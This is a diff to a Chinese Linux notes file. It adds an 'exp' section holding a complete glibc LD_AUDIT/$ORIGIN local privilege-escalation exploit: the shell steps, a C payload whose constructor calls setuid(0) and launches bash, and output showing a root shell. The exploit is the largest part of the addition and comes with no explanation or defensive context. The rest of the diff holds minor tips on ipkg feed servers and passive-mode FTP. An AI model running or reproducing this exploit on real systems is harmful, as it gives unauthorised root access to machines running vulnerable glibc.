@@ -58,9 +58,43 @@ title: "Linux基础汇总"
 	useradd application
 	passwd // 根据提示设置密码
 	
-* test
+* exp
 
+	    $ mkdir /tmp/exploit
+	    $ ln /bin/ping /tmp/exploit/target
+	    $ exec 3< /tmp/exploit/target
+	    $ ls -l /proc/$$/fd/3
+	    $ rm -rf /tmp/exploit/
+	    $ cat > payload.c
+	    void __attribute__((constructor)) init()
+	    {
+	        setuid(0);
+	        system("/bin/bash");
+	    }
+	    ^D
+	    $ gcc -w -fPIC -shared -o /tmp/exploit payload.c
+	    $ ls -l /tmp/exploit
+	    $ LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
+	    sh-4.1# whoami
+	    root
+	    sh-4.1# id
+	    uid=0(root) gid=500(taviso)
 
+* 自己建立ipkg feed服务器
+
+	[http://www.oesf.org/index.php?title=Setting_Up_A_Feed ipkg-make-index.sh]
 	
+	[http://buffalo.nas-central.org/wiki/Construct_ipkg_packages_(for_developers)]
+	
+	详细讲解
+	
+	gzip -9c Packages > Packages.gz
+
+* 连接godaddy的ftp需要用passive模式。ftp之后，运行passive
+
+* C库（glibc）
+	sfs
+
+
 
 
